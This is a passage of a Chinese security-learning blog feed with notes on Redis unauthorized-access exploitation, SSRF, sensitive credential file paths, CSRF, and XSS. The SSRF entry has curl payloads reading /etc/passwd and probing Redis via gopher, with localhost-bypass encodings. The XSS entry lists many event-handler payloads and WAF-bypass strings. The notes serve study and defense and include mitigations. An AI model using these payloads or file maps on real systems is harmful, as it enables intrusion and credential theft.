title="存在漏洞"></a>存在漏洞</h4><ol><li>未授权访问</li><li>访问敏感文件</li><li>root权限写入webshell</li><li>root权限写入公私钥</li></ol><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>能访问到、能登录、能写入（有root）</p><ol><li>开放在公网，没有和ip绑定，默认无密码</li><li>root权限</li><li>webshell和公私钥匙通信原理</li><li>有可能把redis的默认端口6379修改</li></ol><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h5><p>Redis默认情况下，会绑定在0.0.0.0:6379<br>如果没有配置非信任来源的IP访问限制，就会将Redis服务暴露在公网上<br>如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据</p><h5 id="Redis写入Webshell"><a href="#Redis写入Webshell" class="headerlink" title="Redis写入Webshell"></a>Redis写入Webshell</h5><p>如果存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限<br>即可通过redis在指定的web目录下写入一句话木马，用菜刀连接可达到控制服务器的目的</p><h5 id="Redis密钥登录SSH"><a href="#Redis密钥登录SSH" class="headerlink" title="Redis密钥登录SSH"></a>Redis密钥登录SSH</h5><p>redis对外开放，且是未授权访问状态，并且redis服务ssh对外开放，可以通过key登入时<br>在数据库中插入一条数据，将本机的公钥作为value，key值随意<br>然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys<br>把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key</p><h5 id="利用计划任务反弹shell"><a href="#利用计划任务反弹shell" class="headerlink" title="利用计划任务反弹shell"></a>利用计划任务反弹shell</h5><p>利用Redis未授权漏洞，可以通过写入文件到系统计划任务目录 /var/spool/cron下来执行</p><h5 id="远程主从复制RCE"><a href="#远程主从复制RCE" class="headerlink" title="远程主从复制RCE"></a>远程主从复制RCE</h5><p>4.x、5.x版本中，Redis提供了主从模式<br>主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写<br>通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式<br>在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件<br>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令<br>缺点是如果目标机子只允许本地登录，则这种利用方法就不行了</p><h5 id="本地Redis主从复制RCE反弹shell"><a href="#本地Redis主从复制RCE反弹shell" class="headerlink" title="本地Redis主从复制RCE反弹shell"></a>本地Redis主从复制RCE反弹shell</h5><p>对于只允许本地连接的Redis服务器，可以通过开启主从模式从远程主机上同步恶意.so文件至本地，接着载入恶意.so文件模块，反弹shell至远程主机。</p><h4 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h4><p>redis的安全设置：设置完毕，需要重加载配置文件启动redis</p><ol><li>绑定内网ip地址进行访问</li><li>requirepass设置redis密码</li><li>保护模式开启protected-mode开启（默认开启）</li><li>最好把端口更改</li><li>单独为redis设置一个普通账号，启动redis</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF服务器端请求伪造</title>
      <link href="/2023/07/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2023/07/07/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>SSRF是一种由攻击者构造形成由服务端发起请求的一个安全漏洞<br>SSRF攻击的目标一般是作为跳板机访问从外网无法访问的内部系统<br>（正是因为它是由服务端发起的，所以它能够请求到内网）<br><a href="https://smms.app/image/daoBFcPQqzvXkpy" target="_blank"><img src="https://s2.loli.net/2023/07/07/daoBFcPQqzvXkpy.png" width="500" /></a></p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制<br>因此可以从指定URL地址获取网页完本内容、加载指定地址的图片、下载等。</p><h4 id="利用价值"><a href="#利用价值" class="headerlink" title="利用价值"></a>利用价值</h4><p>利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol><li>探测内网信息,用协议探<code>ftp%26ip=&#123;ip&#125;%26port=&#123;port&#125;</code>（dict协议）</li><li>攻击内网或本地其他服务（比如溢出）</li><li>穿透防火墙</li><li>对内网web应用进行指纹识别，通过访问应用存在的默认文件实现</li><li>利用file协议读取本地文件</li><li>利用Redis未授权访问，HTTP CRLF注入</li><li>DOS攻击（请求大文件，始终保持连接keep alive always）等等</li><li>ophergopher协议/gopher协议访问，反弹shell</li></ol><h4 id="漏洞出现点"><a href="#漏洞出现点" class="headerlink" title="漏洞出现点"></a>漏洞出现点</h4><ol><li>能够对外发起网络请求的地方</li><li>请求远程服务器资源的地方</li><li>数据库内置功能</li><li>邮件系统</li><li>文件处理</li><li>在线处理工具</li></ol><p><strong>举几个例子：</strong></p><ol><li>在线识图，在线文档翻译，分享，订阅等</li><li>根据远程URL上传，静态资源图片等</li><li>数据库的比如mongodb的copyDatabase函数</li><li>邮件系统就是接收邮件服务器地址这些地方。</li><li>文件就找ImageMagick，xml这些。</li><li>从URL关键字（source,share,link,src,imageurl,target等）</li></ol><h4 id="SSRF漏洞相关函数和类"><a href="#SSRF漏洞相关函数和类" class="headerlink" title="SSRF漏洞相关函数和类"></a>SSRF漏洞相关函数和类</h4><p>file_get_contents()将整个文件或一个url所指向的文件读入一个字符串中。<br>readfile()输出一个文件的内容。<br>fsockopen()打开一个网络连接或者一个Unix 套接字连接。<br>curl_exec()初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。<br>fopen()打开一个文件文件或者 URL。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>http协议访问<code>url=http://127.0.0.1/1.txt</code></li><li><a href="https://www.cnblogs.com/endust/p/11804767.html">PHP伪协议访问</a><a href="https://smms.app/image/IHa9JMnTCySpNWO" target="_blank"><img src="https://s2.loli.net/2023/07/07/IHa9JMnTCySpNWO.png" width="600" /></a></li><li>Gopher协议</li><li>FastCGI协议</li><li>Redis协议<br>```<h1 id="利用file协议查看文件"><a href="#利用file协议查看文件" class="headerlink" title="利用file协议查看文件"></a>利用file协议查看文件</h1>curl -v ‘<a href="http://sec.com/ssrf.php?url=file:///etc/passwd&#39;">http://sec.com/ssrf.php?url=file:///etc/passwd&#39;</a></li></ol><h1 id="利用dict探测端口"><a href="#利用dict探测端口" class="headerlink" title="利用dict探测端口"></a>利用dict探测端口</h1><p>curl -v ‘<a href="http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&#39;">http://sec.com/ssrf.php?url=dict://127.0.0.1:6379&#39;</a></p><h1 id="利用gopher协议反弹shell"><a href="#利用gopher协议反弹shell" class="headerlink" title="利用gopher协议反弹shell"></a>利用gopher协议反弹shell</h1><p>curl -v ‘<a href="http://sec.com/ssrf.php?url=gopher://127.0.0.1:6379/_....&#39;">http://sec.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379/_....&#39;</a></p><pre><code>#### 绕过姿势1. 利用HTTP基本身份认证的方式绕过`http://example.com@127.0.0.1`2. 利用IP地址的省略写法绕过,`http://123.254.34.254&gt;&gt;http://[::123.254.34.254]`3. DNS解析 `http://127.0.0.1.xip.io/` 可以指向任意ip的域名：`xip.io`4. 利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址[**绕过**](https://tool.520101.com/wangluo/jinzhizhuanhuan/)5. `http://127.1/a.txt` 或者 `http://0/a.txt`6. file_get_contents()函数遇到了不认识的伪协议头 `httpsssss://` ，就会将他当做文件夹，然后再配合目录穿越即可读取文件#### 其他各种指向127.0.0.1的地址</code></pre><p><a href="http://localhost/">http://localhost/</a>         # localhost就是代指127.0.0.1<br><a href="http://0.0.0.0/">http://0/</a>                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行<br>http://[::]:80/           # 在liunx下可用，window测试了下不行<br><a href="http://127.0.0.1/">http://127。0。0。1/</a>       # 用中文句号绕过<br>http://①②⑦.⓪.⓪.①<br><a href="http://127.0.0.1/">http://127.1/</a><br><a href="http://127.0.0.1/">http://127.00000.00000.001/</a> # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p><p>```</p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>1.地址做白名单处理<br>2.域名识别IP 过滤内部IP<br>3.校验返回的内容对比是否与假定的一致</p><h4 id="CSRF、SSRF和重放攻击有什么区别？"><a href="#CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="CSRF、SSRF和重放攻击有什么区别？"></a>CSRF、SSRF和重放攻击有什么区别？</h4><ul><li>CSRF是跨站请求伪造攻击，由客户端发起</li><li>SSRF是服务器端请求伪造，由服务器发起</li><li>重放攻击是将截获的数据包进行重放，达到身份认证等目的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统敏感文件路径汇总</title>
      <link href="/2023/07/07/%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E6%B1%87%E6%80%BB/"/>
      <url>/2023/07/07/%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre><code>c:/boot.ini //查看系统版本c:/windows/php.ini //php配置信息c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码c:/winnt/php.inic:/winnt/my.inic:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码c:\Program Files\Serv-U\ServUDaemon.inic:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此c:\Program Files\RhinoSoft.com\ServUDaemon.exeC:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件//存储了pcAnywhere的登陆密码c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机d:\APACHE\Apache2\conf\httpd.confC:\Program Files\mysql\my.iniC:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码%WINDIR%%WINDIR%\system32%TEMP%%LOCALAPPDATA%%APPDATA%</code></pre><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre><code>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件/usr/local/apache2/conf/httpd.conf/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/usr/local/app/php5/lib/php.ini //PHP相关设置/etc/sysconfig/iptables //从中得到防火墙规则策略/etc/httpd/conf/httpd.conf // apache配置文件/etc/rsyncd.conf //同步程序配置文件/etc/my.cnf //mysql的配置文件/etc/redhat-release //系统版本/etc/issue/etc/issue.net/usr/local/app/php5/lib/php.ini //PHP相关设置/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/sysconfig/iptables 查看防火墙策略etc/passwd   用户信息文件etc/crontab   定时任务文件etc/anacrontab   异步定时任务文件etc/rc.d/rc.local   开机启动项var/log/btmp   登录失败日志，使用last命令查看var/log/cron   定时任务执行日志/var/log/lastlog   所有用户最近登录信息，使用lastlog查看var/log/secure   验证、授权等日志var/log/wtmp   包含用户登录日志，使用last命令查看var/log/utmp   当前登录系统的用户信息，使用last命令查看</code></pre><h4 id="文件寻找方法"><a href="#文件寻找方法" class="headerlink" title="文件寻找方法"></a>文件寻找方法</h4><pre><code>【Windows】# 全盘查找文件，一定要加一个星号！for /r c:\ %i in (password.txt*) do @echo %ifor /r c:\ %i in (*.ini) do @echo %i# 查找 C 盘中包含 password 字样的文件，一定要双引号！findstr /s /n &quot;password&quot; c:\*# 查找 pwd.txt 中是否包含 password 字样，一定要双引号！find /N /I &quot;password&quot; pwd.txt【Linux】# 查找文件find / -name filename.ext# 全盘查找含有 flag 的文件grep flag -r /</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF跨站点请求伪造</title>
      <link href="/2023/07/07/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2023/07/07/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>是社工的一种，不大流行，但如果被成功利用，危害很大。</p><h4 id="XSS与CSRF区别"><a href="#XSS与CSRF区别" class="headerlink" title="XSS与CSRF区别"></a>XSS与CSRF区别</h4><p>XSS通过<code>盗取</code>网站内的已有的用户的身份，然后再执行相关操作<br>CSRF通过<code>伪装</code>用户身份，通过服务器身份认证后，然后发送恶意请求<br>虽然两者有一些区别，但是通常结合使用</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在浏览器中cookie在一段时间内是不会过期（不关闭或者退出浏览器）<br>如果在cookie存在期间，通过构造csrf脚本或包含csrf脚本的链接发送给用户<br>得到信息后，再伪造成用户身份，执行相关操作<br>攻击者盗用了受害者的身份，以受害者的名义发送恶意请求<br>对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作</p><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>比如发消息、盗号、转账等没有没有需要再次验证身份的基本操作<br>再要验证身份的话，那就再社工搭建一个一模一样的网站</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p><strong>站外攻击：</strong><br>用户在攻击者构造的网站中触发伪造请求时，强制用户客户端就会发起请求<br><strong>站内攻击：</strong><br>如果开发人员滥用 <code>$_REQUEST</code> 类变量，以Post提交的数据表单，也支持Get传参。<br>攻击者把预测的请求参数上传到站内贴子或留言的图片链接里<br>当用户浏览了含有请求参数的页面就强制发出这些请求。</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol><li>对网站管理员进行攻击</li><li>修改受害网站上的用户账户和数据</li><li>账户劫持</li><li>传播CSRF蠕虫进行大规模攻击</li><li>利用csrf进行拖库</li><li>利用其他漏洞进行组合拳攻击</li><li>针对路由器的csrf攻击</li></ol><h4 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h4><ol><li>尽量使用POST，限制GET；</li><li>浏览器Cookie策略（时间生存周期管理和签名校验管理）；</li><li>加验证码；</li><li>Referer Check；</li><li>Anti CSRF Token；</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>更改数据包POST/GET</li><li>修改Referer</li><li>利用XSS漏洞或其他方法将代码注入目标服务器，诱使受害者触发</li><li>使用Burp右键tool里生成一个PoC</li></ol><p>好像就这么多，CSRF没啥好讲的了。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过去两个月干了啥？</title>
      <link href="/2023/07/07/%E8%BF%87%E5%8E%BB%E4%B8%A4%E4%B8%AA%E6%9C%88%E5%B9%B2%E4%BA%86%E5%95%A5%EF%BC%9F/"/>
      <url>/2023/07/07/%E8%BF%87%E5%8E%BB%E4%B8%A4%E4%B8%AA%E6%9C%88%E5%B9%B2%E4%BA%86%E5%95%A5%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>也没干啥正事，天天打CTF有点倦了，休息一下。</p><p>首先吐槽一下web方向的一部分题目<br>经常能遇到各种各样的脑瘫题目完全脱离现实<br>有的知识点并不实用就罢了，出题人为了出点新题还会把题目设置得脑洞要特别大才能做出来<br>你们说 <code>Misc</code> 安全杂项本来就是这样那就算了， <code>Web</code> 安全也这样真的合适吗？<br>不过幸好现在 CTF 大赛都已经往实战的方向走了。<br>然后就是区块链，上次陕西省赛的区块链给个纸条猜地址是什么鬼……</p><p>除了CTF以外，自己也挖了几个洞，差不多总结了一套渗透的方案</p><p>7月前后到处发简历，想参加一下护网、实习之类的攒攒经验<br>在面试了两三个之后，感觉身为大一还是太菜了，根本抢不过高年级的<br>我总结了一下常见的问题（可能是常见的吧）：</p><ol><li>正常的询问年龄学历，对岗位的了解</li><li><code>OWASP top10</code> 原理、预防、实践（深度看具体情况）</li><li>SQLmap之类渗透工具的使用</li><li>实战中不同情况下的处理情况（只能多实践了）</li><li>ip，同源策略，DNS等等网络相关的问题<br>如果把市面上流传的面筋背个滚瓜烂熟大概初级的岗位面试是没太大问题</li></ol><p>后面几天先把之前的笔记修补更正一下<br>回家之后再学习红蓝相关的技术吧<br>有空再学学区块链合约审计之类的</p><p>行吧，不知道说啥就这样吧<br>下次见</p><p><a href="https://smms.app/image/J5wCygPKH4mBueN" target="_blank"><img src="https://s2.loli.net/2023/07/07/J5wCygPKH4mBueN.gif" width="300" /></a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站攻击</title>
      <link href="/2023/04/21/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
      <url>/2023/04/21/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>   XSS又叫CSS（Cross Site Script）是指恶意攻击者往Web页面里插入恶意Script代码<br>   当用户<code>浏览该页</code>时，其中的Script代码会被执行，从而达到恶意攻击用户的目的。<br>   xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，所以xss漏洞关键就是寻找参数未过滤的输出函数。<br>   常见的输出函数有：echo printf print print_r sprintf die var-dump var_export</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>（1）攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）<br>（2）诱使受害者打开受到攻击的服务器URL<br>（3）受害者在Web浏览器中打开URL时自动执行恶意脚本</p><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>（1）反射型XSS：&lt;非持久化&gt;<br>需要欺骗用户自己去点击链接才能触发XSS代码，一般容易出现在搜索页面，由后端代码进行处理。<br>（2）存储型XSS：&lt;持久化&gt;<br>每当有用户访问污染页面的时候都会触发代码执行。代码存储在服务器数据库中，如在个人信息或发表文章等地方。<br>（3）DOM型XSS：<br>DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。<br>DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。<br>客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行。<br>如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。<br>一般是浏览器前端代码进行处理。<br><em><strong>反射和dom的区别:<br>DOM-XSS是javascript处理输出， 而反射性xss是后台程序处理</strong></em></p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1.挂马<br>2.盗取用户Cookie。<br>3.DOS（拒绝服务）客户端浏览器。<br>4.钓鱼攻击，高级的钓鱼技巧。<br>5.删除目标文章、恶意篡改数据、嫁祸。<br>6.劫持用户Web行为，甚至进一步渗透内网。<br>7.爆发Web2.0蠕虫。<br>8.蠕虫式的DDoS攻击。<br>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>各种标签的XSS形式</strong></p><pre><code>&lt;script&gt; 标签用于定义客户端脚本，比如 JavaScript。&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&lt;img&gt; 标签定义 HTML 页面中的图像。&lt;img src=1 onerror=alert(1);&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;&lt;input&gt; 标签规定了用户可以在其中输入数据的输入字段。onfocus 事件在对象获得焦点时发生：&lt;input onfocus=alert(1);&gt;&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;&lt;input onfocus=&quot;alert(1);&quot; autofocus&gt;&quot; οnclick=alert(1)&gt;        这样需要点击一下输入框&lt;br&gt;&quot; onmouseover=alert(1)&gt;    需要鼠标划过输入框&lt;br&gt;&lt;details&gt; 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 &lt;details&gt; 元素时触发：&lt;details ontoggle=alert(1);&gt;&lt;svg&gt; 标签用来在HTML页面中直接嵌入SVG 文件的代码。&lt;svg onload=alert(1);&gt;&lt;select&gt; 标签用来创建下拉列表。&lt;select onfocus=alert(1)&gt;&lt;/select通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：&lt;select onfocus=alert(1) autofocus&gt;&lt;iframe&gt; 标签会创建包含另外一个文档的内联框架。&lt;iframe onload=alert(1);&gt;&lt;/iframe&gt;&lt;video&gt; 标签定义视频，比如电影片段或其他视频流。&lt;audio&gt; 标签定义声音，比如音乐或其他音频流。&lt;audio src=x  onerror=alert(1);&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;body&gt; 标签定义文档的主体。&lt;body onload=alert(1);&gt;onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发&lt;bodyonscroll=alert(1);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;textarea&gt; 标签定义一个多行的文本输入控件。&lt;textarea onfocus=alert(1); autofocus&gt;&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐&lt;marquee onstart=alert(1)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以&lt;isindex type=image src=1 onerror=alert(1)&gt;//仅限于IE</code></pre><p><strong>绕过过滤方法</strong></p><pre><code>【大小写】【没有分号】【Flash】【Fuzz进行测试】【双层标签绕过】【空格过滤】/**/注释符号绕过/符号绕过【引号过滤】如果是html标签中，可以不用引号在js中，可以用反引号代替单双引号【括号过滤】使用throw绕过 throw 语句用于当错误发生时抛出一个错误【关键字过滤】大小写绕过双写绕过字符串拼接绕过（利用eval()函数）在js中用反引号代替单双引号编码绕过    Unicode编码绕过    &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&quot;&gt;    javasc&amp;#x72;&amp;#x69;pt:alert(/xss/)          (编码了r和i)    &lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061&#39;)&quot;&gt;    url编码绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61&#39;))&quot;&gt;    &lt;iframe src=&quot;data:text/html,%3C&quot;&gt;&lt;/iframe&gt;    Ascii码绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108))&quot;&gt;    hex绕过    &lt;img src=x onerror=eval(&#39;\x61&#39;)&gt;    base64绕过    &lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;XXXXX==&#39;))&quot;&gt;    &lt;iframe src=&quot;data:text/html;base64,XXXXX==&quot;&gt;【过滤url地址】使用url编码    &lt;img src=&quot;x&quot; onerror=document.location=`http://%77/`&gt;    javasc&amp;#x72;&amp;#x69;pt:alert(&#39;xsshttp://&#39;)使用IP    十进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;    八进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://0177.0.0.01/`&gt;    十六进制IP    &lt;img src=&quot;x&quot; onerror=document.location=`http://0x7f.0x0.0x0.0x1/`&gt;    html标签中用//代替http://    &lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;    使用\\    使用中文逗号代替英文逗号    &lt;img src=&quot;x&quot; onerror=&quot;document.location=`http:\\www。baidu。com`&quot;&gt;【单引号闭合+htmlspecialchars函数绕过】&#39;onmouseover=&#39;alert(/xss/)【JavaScript伪协议】&quot;&gt;&lt;a href=javascript:alert(/xss/)&gt;                  o_n和&lt;scr_ipt&gt;过滤【HttpOnly绕过】什么是HttpOnly？cookie中设置了HttpOnly属性后js脚本将无法读取到cookie信息但是使用下面这样仍然可以读取Cookie cookies[]=request.getCookies();【其它waf绕过思路】（1）标签语法替换&lt;scr&lt;script&gt;ipt&gt;alert(&quot;XSS&quot;)&lt;/scr&lt;script&gt;ipt&gt;&lt;script src=&quot;http://xxx/&quot;&gt;&lt;/script&gt;（2）特殊符号干扰（3）提交方式更改（4）垃圾数据溢出（5）加密解密算法（6）结合其他漏洞绕过</code></pre><h4 id="结合其他漏洞绕过"><a href="#结合其他漏洞绕过" class="headerlink" title="结合其他漏洞绕过"></a>结合其他漏洞绕过</h4><pre><code>WAF名称：CloudflarePayload：&lt;a”/onclick=(confirm)()&gt;click绕过技术：非空格填充WAF名称：WordfencePayload：&lt;a/href=javascript&amp;colon;alert()&gt;click绕过技术：数字字符编码WAF名称：BarracudaPayload：&lt;a/href=Java%0a%0d%09script&amp;colon;alert()&gt;click绕过技术：数字字符编码WAF名称：ComodoPayload：&lt;d3v/onauxclick=(((confirm)))“&gt;click绕过技术：黑名单中缺少事件处理器以及函数调用混淆WAF名称：F5Payload：&lt;d3v/onmouseleave=[2].some(confirm)&gt;click绕过技术：黑名单中缺少事件处理器以及函数调用混淆WAF名称：ModSecurityPayload：&lt;details/open/ontoggle=alert()&gt;绕过技术：黑名单中缺少标签或事件处理器WAF名称：dotdefenderPayload：&lt;details/open/ontoggle=(confirm)()//绕过技术：黑名单中缺少结束标签、事件处理器和函数调用混淆</code></pre><h4 id="还有一些很重要的东西"><a href="#还有一些很重要的东西" class="headerlink" title="还有一些很重要的东西"></a>还有一些很重要的东西</h4><p>xss网站最好自己搭建一个，因为可能会过滤xss关键字<br>最好使用只带有数字的域名或ip<br>利用vps，用nc端口监听</p><h4 id="XSStrike工具使用"><a href="#XSStrike工具使用" class="headerlink" title="XSStrike工具使用"></a>XSStrike工具使用</h4><p><a href="https://blog.csdn.net/RuoLi_s/article/details/113192507?ops_request_misc=&request_id=&biz_id=102&utm_term=XSStrike&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-113192507.nonecase&spm=1018.2226.3001.4187"><strong>使用说明</strong></a></p><h4 id="XSS的防御措施"><a href="#XSS的防御措施" class="headerlink" 